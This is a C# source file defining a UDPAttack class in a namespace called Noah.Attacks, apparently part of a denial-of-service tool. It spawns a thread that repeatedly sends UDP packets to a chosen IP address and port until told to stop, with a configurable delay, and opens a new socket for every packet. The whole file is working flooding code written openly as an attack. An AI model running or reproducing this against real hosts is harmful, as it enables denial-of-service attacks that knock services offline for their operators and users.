using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Noah.Attacks
{
    public class UDPAttack : IAttack
    {
        public string AttackName { get; private set; }

        private string message;
        private ApplicationState state;
        private string ip;
        private int port;

        public UDPAttack(ApplicationState state, string host, int port = 80)
        {
            message = "abcdefghijklmnopqrstuvwxyz";
            this.state = state;
            ip = host;
            this.port = port;
        }

        public void BeginAttack()
        {
            new Thread(() => attack()).Start();
        }

        private void attack()
        {
            state.State = States.Attacking;
            byte[] bytes = Encoding.ASCII.GetBytes(message);
            IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ip), port);

            while (state.State != States.Done)
            {
                Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                sock.SendTo(bytes, endPoint);

                Thread.Sleep(state.Delay);
            }
        }
    }
}
